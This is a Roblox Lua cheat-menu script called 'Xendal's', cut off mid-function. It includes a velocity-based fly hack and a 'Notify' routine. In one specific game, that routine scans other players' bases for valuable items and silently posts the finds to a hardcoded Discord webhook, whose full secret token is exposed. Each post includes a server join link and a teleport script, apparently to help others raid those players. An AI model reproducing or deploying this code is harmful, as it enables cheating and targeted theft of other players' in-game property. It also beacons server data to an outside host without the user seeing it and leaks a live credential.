			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar inicio de arrastre
	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			-- Detectar cuando suelta el mouse
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end
	
	-- Detectar movimiento del mouse
	local function inputChanged(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end
	
	-- Conectar InputChanged global para actualizar mientras arrastra
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
	-- Conectar eventos de Frame
	guiFrame.InputBegan:Connect(inputBegan)
	guiFrame.InputChanged:Connect(inputChanged)
	
	-- Conectar también todos los botones dentro del Frame
	for _, obj in pairs(guiFrame:GetDescendants()) do
		if obj:IsA("GuiButton") then
			obj.InputBegan:Connect(inputBegan)
			obj.InputChanged:Connect(inputChanged)
		end
	end
	
end;
task.spawn(C_29c);
-- StarterGui.Xendal.XendalFly.TextButton.LocalScript
local function C_29e()
local script = G2L["29e"];
	local guided = false  -- Asegúrate de que 'guided' esté inicialmente en 'false'
	local gconn
	local btnTeleg = script.Parent  -- Asegúrate de que el script está dentro del TextButton
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local RunService = game:GetService("RunService")
	local workspaceCam = game:GetService("Workspace").CurrentCamera  -- Asumiendo que workspaceCam es la cámara
	local UserInputService = game:GetService("UserInputService")  -- Servicio para detectar entradas del teclado
	
	-- Función para alternar el estado de 'guided' y cambiar el color del botón
	local function toggleGuided()
		guided = not guided  -- Alternar el estado de 'guided'
	
		-- Cambiar el color del texto del botón basado en el estado de 'guided'
		if btnTeleg then
			btnTeleg.TextColor3 = guided and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)  -- Verde si está activado, blanco si está desactivado
		end
	
		-- Depuración para ver el estado de 'guided'
		print("Estado de 'guided' después de alternar:", guided)
	
		-- Ejecutar la lógica para mover al jugador
		if guided then
			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
			local hrp = char:FindFirstChild("HumanoidRootPart")
	
			-- Asegurarse de que el personaje tenga 'HumanoidRootPart' antes de intentar moverlo
			if hrp then
				gconn = RunService.RenderStepped:Connect(function()
					if guided and hrp then
						-- Movimiento dirigido por la cámara
						hrp.Velocity = workspaceCam.CFrame.LookVector * 25
					end
				end)
			end
		else
			-- Desconectar la conexión si 'guided' es desactivado
			if gconn then
				gconn:Disconnect()
				gconn = nil
			end
		end
	end
	
	-- Activar/desactivar al hacer clic en el botón
	btnTeleg.MouseButton1Click:Connect(function()
		toggleGuided()
	end)
	
	-- Activar/desactivar con la tecla 'V'
	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end  -- Ignorar si el juego ya ha procesado la entrada (por ejemplo, si está en un cuadro de texto)
		if input.KeyCode == Enum.KeyCode.V then
			toggleGuided()  -- Alternar el estado de 'guided' al presionar V
		end
	end)
	
end;
task.spawn(C_29e);
-- StarterGui.Xendal.Open.LocalScript
local function C_2a2()
local script = G2L["2a2"];
	local button = script.Parent
	button.Visible = false
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")
	
	local xendal = playerGui:WaitForChild("Xendal")
	local xandals = xendal:WaitForChild("Xandal's")
	
	button.MouseButton1Click:Connect(function()
	    xandals.Visible = true    -- Muestra el Frame
	    button.Visible = false    -- Se oculta a sí mismo
	end)
	
end;
task.spawn(C_2a2);
-- StarterGui.Xendal.Open.LocalScript
local function C_2a3()
local script = G2L["2a3"];
	-- Referencia al Frame principal de tu GUI
	local guiFrame = script.Parent
	
	-- Variables para el arrastre
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar cuando empieza a arrastrar
	guiFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or
			input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Detectar movimiento
	guiFrame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or
			input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	-- Actualizar la posición mientras arrastra
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
end;
task.spawn(C_2a3);
-- StarterGui.Xendal.Notify
local function C_2a9()
local script = G2L["2a9"];
	if game.PlaceId ~= 109983668079237 then
		return
	end
	
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1441973041868443798/imWXBKQltP9VFcDhXr_ema7gagVfFSPsTis6q8Vl_qQhlQEm7yBnSNWVJsckJGo1c8OF"
	local MIN_VALUE   = 10000000
	local MAX_VALUE   = 50000000
	
	local HttpService = game:GetService("HttpService")
	local Workspace = game:GetService("Workspace")
	
	local function isPrivateServer()
		local success, msg = pcall(function()
			local gui = Workspace:WaitForChild("Map"):WaitForChild("Codes"):WaitForChild("Main")
				:WaitForChild("SurfaceGui"):WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
			return gui and gui:IsA("GuiObject") and gui.Visible
		end)
		return success and msg
	end
	
	local function sendHttpRequest(url, method, data)
		local success, result = pcall(function()
			local payload = HttpService:JSONEncode(data)
			-- Enviar la solicitud HTTP sin print o warn
			if request then
				return request({Url=url, Method=method, Headers={["Content-Type"]="application/json"}, Body=payload})
			elseif http_request then
				return http_request({Url=url, Method=method, Headers={["Content-Type"]="application/json"}, Body=payload})
			elseif http and http.request then
				return http.request({Url=url, Method=method, Headers={["Content-Type"]="application/json"}, Body=payload})
			end
		end)
		return success, result
	end
	
	local function formatValueSuffix(val)
		local display = val
		local suffix = ""
		if val >= 1e9 then
			display = val / 1e9
			suffix = "B"
		elseif val >= 1e6 then
			display = val / 1e6
			suffix = "M"
		elseif val >= 1e3 then
			display = val / 1e3
			suffix = "K"
		end
		if display % 1 == 0 then
			display = math.floor(display)
		else
			display = string.format("%.2f", display)
		end
		return "$"..display..suffix
	end
	
	local function getAnimalData(overhead)
		if not overhead then return nil end
		local displayName = overhead:FindFirstChild("DisplayName") and overhead.DisplayName.Text or "Unknown"
		local genLabel = overhead:FindFirstChild("Generation")
		if not genLabel then return nil end
	
		local genText = genLabel.Text
		local value = tonumber(genText:match("%d+%.?%d*")) or 0
		if genText:find("K") then value = value * 1000
		elseif genText:find("M") then value = value * 1000000
		elseif genText:find("B") then value = value * 1000000000 end
	
		return {DisplayName = displayName, Value = value, Generation = genText}
	end
	
	local function findAllAnimals()
		local animals = {}
		local plots = Workspace:FindFirstChild("Plots")
		if not plots then return animals end
	
		for _, desc in pairs(plots:GetDescendants()) do
			if desc:IsA("BillboardGui") and desc.Name == "AnimalOverhead" then
				local stolenLabel = desc:FindFirstChild("Stolen")
				local isStolen = stolenLabel and stolenLabel:IsA("TextLabel") and stolenLabel.Text:upper() == "FUSING"
				if not isStolen then
					local animal = getAnimalData(desc)
					if animal and animal.Value >= MIN_VALUE and animal.Value <= MAX_VALUE then
						table.insert(animals, animal)
					end
				end
			end
		end
		return animals
	end
	
	-- Lista de nombres específicos para los que se enviará una imagen
	local validNames = {
		"Meowl", "W or L", "67", "La Grande Combinasion", "Capitano Moby", "Dragon Cannelloni",
		"Orcaledon", "Strawberry Elephant", "Ketupat Kepat", "La Casa Boo", "Spaghetti Tualetti",
		"Los Bros", "Nuclearo Dinossauro", "Las Sis", "Graipuss Medussi", "Garama and Madundung",
		"Burrito Bandito", "Los Mobiles", "Mieteteira Bicicleteira", "Chicleteira Bicicleteira",
		"Chipso and Queso", "Chillin Chili", "Cooki and Milki", "Burguro and Fryuro",
		"La Spooky Grande", "Esok Sekolah", "La Supreme Combinasion", "La Secret Combinasion",
		"1x1x1x1", "Headless Horseman", "Fragrama and Chocrama", "Spooky and Pumpky",
		"Los Spaghettis", "Guest 666", "Ketchuru and Musturu", "Tictac Sahur",
		"La Taco Combinasion", "Tang Tang Keletang", "Los Tacoritas", "Eviledon", 
		"Los Primos", "Los Puggies", "Tralaledon", "La Extinct Grande",
		"Los 67", "Celularcini Viciosini", "Money Money Puggy", "Los Spooky Combinasionas",
		"Los Hotspotsitos", "Los Planitos","Tacorita Bicicleta", "Los Combinasionas",
		"Swag Soda", "Mariachi Corazoni","Los Chicleteiras", "Rang Ring Bus",
		"Los Nooo My Hotspotsitos", "Noo my Candy","Los Quesadillas", "Quesadilla Crocodila",
		"Pot Pumpkin", "Horegini Boom","Pirulitoita Bicicleteira", "Pot Hotspot",
		"To to to Sahur", "La Sahur Combinasion","Telemorte", "Noo my examine",
		"Tung Tung Tung Sahur", "Los Jobcitos","Noo My Hostpot", "Los Cucarachas",
		"Perrito Burrito","Los Mobilis"
	}
	
	local imageLinks = {
		["Meowl"] = "https://media.discordapp.net/attachments/1388607027907137539/1444607741279604810/latest.png?ex=692d534d&is=692c01cd&hm=122cc4031bbec350a04b85ced21bb8763c75372fcb9abd14c8ea7d961710db37&=&format=webp&quality=lossless",
		["W or L"] = "https://media.discordapp.net/attachments/1388607027907137539/1444607854077022319/latest.png?ex=692d5367&is=692c01e7&hm=22bca558a3356c85ded055819976a0763ff7cf0dee3fa5d62d0924b3d78a2e77&=&format=webp&quality=lossless",
		["67"] = "https://media.discordapp.net/attachments/1388607027907137539/1444608023019393104/latest.png?ex=692d5390&is=692c0210&hm=16a37e73cee4cceae37e5bbf37e6525be63606a15c821e847089b69cf78cb6a9&=&format=webp&quality=lossless",
		["La Grande Combinasion"] = "https://media.discordapp.net/attachments/1388607027907137539/1444608441871237140/latest.png?ex=692d53f4&is=692c0274&hm=927b6946788714734a8c9472501a0d956af616cacd72a274b80890ab606f7e09&=&format=webp&quality=lossless",
		["Capitano Moby"] = "https://media.discordapp.net/attachments/1388607027907137539/1444608645290524782/latest.png?ex=692d5424&is=692c02a4&hm=1d0e359ea4dcb25be8a89f97bde456dd804d9bdceb757f2903c5afc67210c2a4&=&format=webp&quality=lossless&width=629&height=596",
		["Dragon Cannelloni"] = "https://media.discordapp.net/attachments/1388607027907137539/1444608874152853525/latest.png?ex=692d545b&is=692c02db&hm=3ca8e4bb667aa46e4bcc5452b1211f02e229f2ac1d3c7fe693565912840383eb&=&format=webp&quality=lossless&width=699&height=596",
		["Orcaledon"] = "https://media.discordapp.net/attachments/1388607027907137539/1444609137131520031/latest.png?ex=692d5499&is=692c0319&hm=2a36adb67ea28b8d35d6a61c0744372a3296b9604599d2db9505374cb80ccb7b&=&format=webp&quality=lossless",
		["Strawberry Elephant"] = "https://media.discordapp.net/attachments/1388607027907137539/1444609350978244649/latest.png?ex=692d54cc&is=692c034c&hm=11ed68b7a86cfe5d216b00937a18e4fedd1f92d39106d7915c6675e6e13f64aa&=&format=webp&quality=lossless",
		["Ketupat Kepat"] = "https://media.discordapp.net/attachments/1388607027907137539/1444609962323087462/latest.png?ex=692d555e&is=692c03de&hm=ff1e4bcb65b393f875dd283f34fa0e20f1b4386d8ec15296541b48ae85eb1b3b&=&format=webp&quality=lossless",
		["La Casa Boo"] = "https://media.discordapp.net/attachments/1388607027907137539/1444610220306333726/latest.png?ex=692d559c&is=692c041c&hm=0e9fe34a22d6fdaf968db6a331a771eb06c2edbff89eeb0c6dc12929538c1158&=&format=webp&quality=lossless&width=481&height=699",
		["Spaghetti Tualetti"] = "https://media.discordapp.net/attachments/1388607027907137539/1444611128708829194/latest.png?ex=692d5674&is=692c04f4&hm=854905660f04a8ab56ea2a767a233d726ed1cfcd70203761a865b84f66d4e9df&=&format=webp&quality=lossless",
		["Los Bros"] = "https://media.discordapp.net/attachments/1388607027907137539/1444611489745866903/latest.png?ex=692d56ca&is=692c054a&hm=f00ab6c5f03bdb79f3f40f02c889f80dce5ec7ff76ad2dff28c5cd2c04700877&=&format=webp&quality=lossless",
		["Nuclearo Dinossauro"] = "https://media.discordapp.net/attachments/1388607027907137539/1444611694759251978/latest.png?ex=692d56fb&is=692c057b&hm=729713aaf2579f1fd048a08e1f3b5a9f9e157ea7ca294b6330a47a1f15286538&=&format=webp&quality=lossless",
		["Las Sis"] = "https://media.discordapp.net/attachments/1388607027907137539/1444612010292805743/latest.png?ex=692d5746&is=692c05c6&hm=d2e5c6ec0e2c98074818cc07b398eade846fac55440039e3abf9f7ceba372551&=&format=webp&quality=lossless",
		["Graipuss Medussi"] = "https://media.discordapp.net/attachments/1388607027907137539/1444612343890841640/latest.png?ex=692d5796&is=692c0616&hm=8f8e327d8ec01196f35e0463064b31d1d74a5d30d2c6e01b07619abf64fb2d66&=&format=webp&quality=lossless&width=336&height=324",
		["Garama and Madundung"] = "https://media.discordapp.net/attachments/1388607027907137539/1444646662550061116/latest.png?ex=692d778c&is=692c260c&hm=f492187e8c9a3a6be94acee56c8124f66bf108f5ab2f038fd1819754de7e117e&=&format=webp&quality=lossless",
		["Burrito Bandito"] = "https://media.discordapp.net/attachments/1388607027907137539/1444647222485586114/latest.png?ex=692d7812&is=692c2692&hm=a352c689c20c9a9ed09efe33dce384a3236b72d86adb647f311a7ac626e00c29&=&format=webp&quality=lossless",
		["Los Mobiles"] = "https://media.discordapp.net/attachments/1388607027907137539/1444647486995038329/latest.png?ex=692d7851&is=692c26d1&hm=57736373b496d5608be399fb51640a960620690a005bf92ba09dd30b394e2244&=&format=webp&quality=lossless",
		["Mieteteira Bicicleteira"] = "https://media.discordapp.net/attachments/1388607027907137539/1444647947483615353/latest.png?ex=692d78be&is=692c273e&hm=5564f3c61808a356921ce5533d21e435150c519939b7204c55b30839ff23101b&=&format=webp&quality=lossless",
		["Chicleteira Bicicleteira"] = "https://media.discordapp.net/attachments/1388607027907137539/1444648175599353887/latest.png?ex=692d78f5&is=692c2775&hm=42973c8bd4f39526410704f210390247759626d8d535490b8143c47673296227&=&format=webp&quality=lossless",
		["Chipso and Queso"] = "https://media.discordapp.net/attachments/1388607027907137539/1444648411457523824/latest.png?ex=692d792d&is=692c27ad&hm=bf8a960704afb597155dd1e1d463dbf6afcb14460ba1c07c408f967b81ff39f8&=&format=webp&quality=lossless",
		["Chillin Chili"] = "https://media.discordapp.net/attachments/1388607027907137539/1444648924697595904/latest.png?ex=692d79a7&is=692c2827&hm=46c5dbaaec5a3205a985e3011e1d2158d5fa2d190b43140c52e422c7919146d6&=&format=webp&quality=lossless",
		["Cooki and Milki"] = "https://media.discordapp.net/attachments/1388607027907137539/1444649166952202432/latest.png?ex=692d79e1&is=692c2861&hm=2fb1ecd23b485a9231ed3d5e18a8d340311b704cf1a88af680e94f1a2e913536&=&format=webp&quality=lossless",
		["Burguro and Fryuro"] = "https://media.discordapp.net/attachments/1388607027907137539/1444649394161975489/latest.png?ex=692d7a17&is=692c2897&hm=be41adb8d04623cf317e463c3d6d98ff2373bd550f48faaef43437021b0089e2&=&format=webp&quality=lossless",
		["La Spooky Grande"] = "https://media.discordapp.net/attachments/1388607027907137539/1444649514106622167/latest.png?ex=692d7a34&is=692c28b4&hm=b7a8c98c27a635b9f287d93627a09009e76d1a3f761bc074b6728b1277177d55&=&format=webp&quality=lossless",
		["Esok Sekolah"] = "https://media.discordapp.net/attachments/1388607027907137539/1444649659627868180/latest.png?ex=692d7a57&is=692c28d7&hm=1addb5933e483e3c3fd2e794b667d9825bb568c46e0d65c06c27bc5ba328a43f&=&format=webp&quality=lossless",
		["La Supreme Combinasion"] = "https://media.discordapp.net/attachments/1388607027907137539/1444649776929837188/latest.png?ex=692d7a73&is=692c28f3&hm=f1f1687bdeffd14ef481933a6a677b5ba81bf9e7cfd0445f72894f5fde7b42c7&=&format=webp&quality=lossless",
		["La Secret Combinasion"] = "https://media.discordapp.net/attachments/1388607027907137539/1444650154547347466/latest.png?ex=692d7acd&is=692c294d&hm=6975b3bdd7c63efcec2fd9e39f871844fe164ebdb2e9dac2413092ba237db31f&=&format=webp&quality=lossless",
		["1x1x1x1"] = "https://media.discordapp.net/attachments/1388607027907137539/1444650716328366212/latest.png?ex=692d7b53&is=692c29d3&hm=0560df692f19b2de001e31f80d2444a4edffdf7f7d27b62365df9f3d70a009dc&=&format=webp&quality=lossless",
		["Headless Horseman"] = "https://media.discordapp.net/attachments/1388607027907137539/1444651202381086851/latest.png?ex=692d7bc6&is=692c2a46&hm=1bb13670fbe77edd96cd100d8d331e9615a85a7e22c4c510755bbc22868983e1&=&format=webp&quality=lossless",
		["Fragrama and Chocrama"] = "https://media.discordapp.net/attachments/1388607027907137539/1444651344135847967/latest.png?ex=692d7be8&is=692c2a68&hm=7c0b27eeb3e433b0ddcdf89b50cb62f8fe143c33176d6019e8d3e397c400dd0e&=&format=webp&quality=lossless&width=401&height=350",
		["Spooky and Pumpky"] = "https://media.discordapp.net/attachments/1388607027907137539/1444651544728305754/latest.png?ex=692d7c18&is=692c2a98&hm=7ad790cf5fb043187d24e3011a0a05d24a3698368c74f4530107acbe828917b2&=&format=webp&quality=lossless",
		["Los Spaghettis"] = "https://media.discordapp.net/attachments/1388607027907137539/1444651698428706846/latest.png?ex=692d7c3d&is=692c2abd&hm=8a59c85a4ef6579b4f60fbfbd5139dfd1ef18e68f36fc38e5df34f4880e22362&=&format=webp&quality=lossless",
		["Guest 666"] = "https://images-ext-1.discordapp.net/external/b19ALVF0tz1d-v-texqOuYj6wOAsWBGzfO6foyqASQ4/%3Fcb%3D20251102022619/https/static.wikia.nocookie.net/stealabr/images/9/99/Guest666t.png/revision/latest?format=webp",
		["Ketchuru and Musturu"] = "https://media.discordapp.net/attachments/1388607027907137539/1444652896888295567/latest.png?ex=692d7d5a&is=692c2bda&hm=0b741be55ffdc757f64614f37dee913e1de3bed55471614d2295c8ac64afb87a&=&format=webp&quality=lossless",
		["Tictac Sahur"] = "https://media.discordapp.net/attachments/1388607027907137539/1444653048663113728/latest.png?ex=692d7d7f&is=692c2bff&hm=a83062a1799ebf4ba36663783471189fa12fd13b2434c6757a3e3177b586fec2&=&format=webp&quality=lossless",
		["La Taco Combinasion"] = "https://media.discordapp.net/attachments/1388607027907137539/1444653227705634927/latest.png?ex=692d7da9&is=692c2c29&hm=576a94d7f81e39d55966df7fb9e588ad0b9b54b5cd94cec1be8e8b3d4504194e&=&format=webp&quality=lossless",
		["Tang Tang Keletang"] = "https://cdn.discordapp.com/attachments/1388607027907137539/1444653450909454417/latest.png?ex=692d7ddf&is=692c2c5f&hm=3149524a52407b665feae8be907ef3bf2d6578273e609347a2a5ebe536db29b9",
		["Los Tacoritas"] = "https://media.discordapp.net/attachments/1388607027907137539/1444653630388043836/latest.png?ex=692d7e09&is=692c2c89&hm=d8fbd0534388b311d97b6944e06af2841a4d33d5133106715c06c15c63e8d1e2&=&format=webp&quality=lossless&width=486&height=350",
		["Eviledon"] = "https://media.discordapp.net/attachments/1388607027907137539/1444653763234107533/latest.png?ex=692d7e29&is=692c2ca9&hm=61a013e0d9ffe59239add7c6debd1840b0d78cb53abff1156b5c414dd0ddb918&=&format=webp&quality=lossless",
		["Los Primos"] = "https://media.discordapp.net/attachments/1388607027907137539/1444654165895811092/latest.png?ex=692d7e89&is=692c2d09&hm=17514d6e1db869446f8f41978b25b38c1739c933fdb1efd2be8a752f25886d27&=&format=webp&quality=lossless",
		["Los Puggies"] = "https://media.discordapp.net/attachments/1388607027907137539/1444654424940089486/latest.png?ex=692d7ec7&is=692c2d47&hm=bdef143e80877901b433447483f1ad8ddd491ec55d6618d75d923f5bc30c91c9&=&format=webp&quality=lossless",
		["Tralaledon"] = "https://cdn.discordapp.com/attachments/1388607027907137539/1444654559325585518/latest.png?ex=692d7ee7&is=692c2d67&hm=24caab37a8bfa2929971a84d3f8ab04a5550ef005cb4428f6d3235148c2b0acb",
		["La Extinct Grande"] = "https://media.discordapp.net/attachments/1388607027907137539/1444654794856992918/latest.png?ex=692d7f1f&is=692c2d9f&hm=ec86b1bef4a8dd5594c33967e1d0ae8a4f68d5d63e5083e7a6578ce554fd520b&=&format=webp&quality=lossless",
		["Los 67"] = "https://media.discordapp.net/attachments/1388607027907137539/1444654970916835388/latest.png?ex=692d7f49&is=692c2dc9&hm=32895781def8beee4d6c45bf7e544a3d1ac675ffde0bd9ffc7079abce3db4001&=&format=webp&quality=lossless",
		["Celularcini Viciosini"] = "https://media.discordapp.net/attachments/1388607027907137539/1444655117180735599/latest.png?ex=692d7f6c&is=692c2dec&hm=148f9c3f531996854739518014aa41bff0e85e60b8c16fbf0a8305617bd27964&=&format=webp&quality=lossless",
		["Money Money Puggy"] = "https://media.discordapp.net/attachments/1388607027907137539/1444655556814966824/latest.png?ex=692d7fd5&is=692c2e55&hm=f06669864b6d3c4e5a64f5f6ac5fbe82645c871ad6a0e483b40cf7029201584e&=&format=webp&quality=lossless&width=904&height=904",
		["Los Spooky Combinasionas"] = "https://media.discordapp.net/attachments/1388607027907137539/1444655854698893503/latest.png?ex=692d801c&is=692c2e9c&hm=11400794d0c95deff6315c6b55473e51e714acf80ab7f83841fc55c2aacd1d6e&=&format=webp&quality=lossless",
		["Los Hotspotsitos"] = "https://media.discordapp.net/attachments/1388607027907137539/1444656194504364042/latest.png?ex=692d806d&is=692c2eed&hm=56367c5f435b88166df0c4a4064b7f048476f7bdc8f00a039a55da27befcaaf3&=&format=webp&quality=lossless",
		["Los Planitos"] = "https://media.discordapp.net/attachments/1388607027907137539/1444656314390151228/latest.png?ex=692d8089&is=692c2f09&hm=f8ac9b66b63e2930f517a75c5bfa9e9d8740312a1e0f0b270cfb5319b6e94937&=&format=webp&quality=lossless",
		["Tacorita Bicicleta"] = "https://cdn.discordapp.com/attachments/1388607027907137539/1444656454756728912/latest.png?ex=692d80ab&is=692c2f2b&hm=c630e51bb332e75afa056b63516eaf2473a2ecce3f38ba43e922b35d2b14972e",
		["Los Combinasionas"] = "https://media.discordapp.net/attachments/1388607027907137539/1444656602656407755/latest.png?ex=692d80ce&is=692c2f4e&hm=53f508c69abc55437ac3513c3651abeeb3e3ccf8a3217fd9852b4b4584895fb0&=&format=webp&quality=lossless",
		["Swag Soda"] = "https://cdn.discordapp.com/attachments/1388607027907137539/1444656759276044439/latest.png?ex=692d80f3&is=692c2f73&hm=7b8d0575a1d550e08fd6694f10f2c5de3fc541e3042711c5531973546ee9fed5",
		["Mariachi Corazoni"] = "https://media.discordapp.net/attachments/1388607027907137539/1444656931552628818/latest.png?ex=692d811c&is=692c2f9c&hm=73ab892981d7e3034c1cb5a3c66f4ce51753ca44373777493d97aaf4ce228d54&=&format=webp&quality=lossless",
		["Los Chicleteiras"] = "https://media.discordapp.net/attachments/1388607027907137539/1444657103062175855/latest.png?ex=692d8145&is=692c2fc5&hm=3b59defaca7ef4e1d01c01020748adfb2452e002dc2ea6d4743dbc2f9e112e89&=&format=webp&quality=lossless",
		["Rang Ring Bus"] = "https://media.discordapp.net/attachments/1388607027907137539/1444657269877772329/latest.png?ex=692d816d&is=692c2fed&hm=68735d86ce834f4da9092e03445a5d6745b56227fdab4d0d60f1ab24df79b2fc&=&format=webp&quality=lossless",
		["Los Nooo My Hotspotsitos"] = "https://cdn.discordapp.com/attachments/1388607027907137539/1444657750226243654/latest.png?ex=692d81e0&is=692c3060&hm=c9429b517a730c08f456a026274f8da133f8d8c8afff238d88b6f23fb18693ed",
		["Noo my Candy"] = "https://media.discordapp.net/attachments/1388607027907137539/1444657901950992434/latest.png?ex=692d8204&is=692c3084&hm=f82403758572fd31776c7cd0e48f5c707abcc13ba20b9f113d0f51f4bf29d70b&=&format=webp&quality=lossless",
		["Los Quesadillas"] = "https://media.discordapp.net/attachments/1388607027907137539/1444658082591408270/latest.png?ex=692d822f&is=692c30af&hm=d6b2e357f32485861c617af660dadcd03fa45175c1ea4abbc7e1df01dd510f29&=&format=webp&quality=lossless",
		["Quesadilla Crocodila"] = "https://media.discordapp.net/attachments/1388607027907137539/1444658229220216872/latest.png?ex=692d8252&is=692c30d2&hm=89740a183ed9b4f0873bd3e7b985c63f0dfb115216070161e6498fadb6bb5d75&=&format=webp&quality=lossless",
		["Pot Pumpkin"] = "https://cdn.discordapp.com/attachments/1388607027907137539/1444658425756909598/latest.png?ex=692d8281&is=692c3101&hm=276a250f5f10c7ad7750b98c034fe653e3861dc6214327b7362c843e2a068183",
		["Horegini Boom"] = "https://media.discordapp.net/attachments/1388607027907137539/1444658526650630175/latest.png?ex=692d8299&is=692c3119&hm=3c7c79b50a1e79e6c6090561148ee06aa9db58c8608278e8a0b7120eeb4b9bf6&=&format=webp&quality=lossless",
		["Pirulitoita Bicicleteira"] = "https://media.discordapp.net/attachments/1388607027907137539/1444658686759796836/latest.png?ex=692d82bf&is=692c313f&hm=21660fb6fe456250703c66cd2b1b708de840fd235219a8adbd7b3317f8c71a86&=&format=webp&quality=lossless",
		["Pot Hotspot"] = "https://media.discordapp.net/attachments/1388607027907137539/1444659093427064842/latest.png?ex=692d8320&is=692c31a0&hm=ba7d8c54fd47b593d09c30fd8d42b46fcbbfa10b5c8b588418a482fc2349e818&=&format=webp&quality=lossless",
		["To to to Sahur"] = "https://media.discordapp.net/attachments/1388607027907137539/1444659226478907592/latest.png?ex=692d8340&is=692c31c0&hm=62ab91077b5f2c55b4b16e3c01ee64c4ab111f8fb01c41c05cc6bd130c356d27&=&format=webp&quality=lossless",
		["La Sahur Combinasion"] = "https://media.discordapp.net/attachments/1388607027907137539/1444659417558679583/latest.png?ex=692d836d&is=692c31ed&hm=036a01f09df93e498cd561a529cb40faaec5d7cc4f36fa46ba142214b728ec18&=&format=webp&quality=lossless",
		["Telemorte"] = "https://media.discordapp.net/attachments/1388607027907137539/1444659617698414682/latest.png?ex=692d839d&is=692c321d&hm=3d5c539bbabda1d2c55b946344bacd2b69bd26dea136a9a6864e6ca0d91c1ce4&=&format=webp&quality=lossless",
		["Noo my examine"] = "https://media.discordapp.net/attachments/1388607027907137539/1444659774246490256/latest.png?ex=692d83c2&is=692c3242&hm=6d732ed43acac094920296c040c176b2941a0653ac2007e606cf6e3858199d90&=&format=webp&quality=lossless",
		["Tung Tung Tung Sahur"] = "https://media.discordapp.net/attachments/1388607027907137539/1444660052358336594/latest.png?ex=692d8404&is=692c3284&hm=fbd41e06d1e5195165bf9ae6ce2713445077240b5c33369decda0ae92254caa1&=&format=webp&quality=lossless",
		["Los Jobcitos"] = "https://media.discordapp.net/attachments/1388607027907137539/1444660270550089728/latest.png?ex=692d8438&is=692c32b8&hm=8a83d7d6bee2a15d65e2946d94927b7280374a841674b5ec2fd909b8205288ef&=&format=webp&quality=lossless",
		["Noo My Hostpot"] = "https://media.discordapp.net/attachments/1388607027907137539/1444660593951772804/latest.png?ex=692d8486&is=692c3306&hm=1619150def936a8486f6669f279323cfbd7096a5b9f2b3f64aebd9a0c3c8e7e5&=&format=webp&quality=lossless",
		["Los Cucarachas"] = "https://media.discordapp.net/attachments/1388607027907137539/1444660868863496202/latest.png?ex=692d84c7&is=692c3347&hm=9431976fc02596d518f38a6c4c4cc438d41f6f2cd6da902b208734a0d2ee30ae&=&format=webp&quality=lossless",
		["Perrito Burrito"] = "https://media.discordapp.net/attachments/1388607027907137539/1444661202063065119/latest.png?ex=692d8517&is=692c3397&hm=e7214d118fc01f14b90ee591f9dbcf540f6f4d8b03a397faada0ff7f91493580&=&format=webp&quality=lossless"
	}    
	
	local function sendToDiscord(animals)
		if #animals == 0 then
			return
		end
	
		local grouped = {}
		for _, animal in ipairs(animals) do
			local key = animal.DisplayName .. "_" .. tostring(animal.Value)
			grouped[key] = grouped[key] or {DisplayName = animal.DisplayName, Value = animal.Value, Count = 0}
			grouped[key].Count = grouped[key].Count + 1
		end
	
		local sorted = {}
		for _, info in pairs(grouped) do
			table.insert(sorted, info)
		end
		table.sort(sorted, function(a,b) return a.Value > b.Value end)
	
		local lines = {}
		for _, info in ipairs(sorted) do
			table.insert(lines, string.format("%dx %s (%s/s)", info.Count, info.DisplayName, formatValueSuffix(info.Value)))
		end
	
		local animalsText = "```\n"..table.concat(lines, "\n").."\n```"
	
		-- Crear el campo de "Animals Data"
		local animalsField = {
			name = "Brainrots Found",  -- Título del campo
			value = animalsText,  -- El valor con el listado de los animales
			inline = false  -- Ocupa toda la línea
		}
	
		-- Crear el campo de "Tp Link"
		local tpLinkField = {
			name = "Tp Link",  -- Título del campo
			value = "[Click Here To Join](https://therealroier.github.io/zz/?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId..")",  -- Enlace de teleportación
			inline = false  -- No en línea
		}
	
		-- Crear el campo de "Tp Script (PC)"
		local tpScriptField = {
			name = "Tp Script (PC)",  -- Título del campo
			value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\",game.Players.LocalPlayer)\n```",  -- Script para teleportar
			inline = false  -- No en línea
		}
	
		local embed = {
			username = "Swihz Notify",
			embeds = {{
	
				title = "Xendal's | Notify",
				color = 16711680,
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				fields = {animalsField, tpLinkField, tpScriptField}  -- Campos de Animals Data, Tp Link y Tp Script
			}}
		}
	
		-- Añadir la imagen correspondiente si el nombre está en la lista
		if table.find(validNames, sorted[1].DisplayName) then
			embed.embeds[1].thumbnail = {
				url = imageLinks[sorted[1].DisplayName]
			}
		end
	
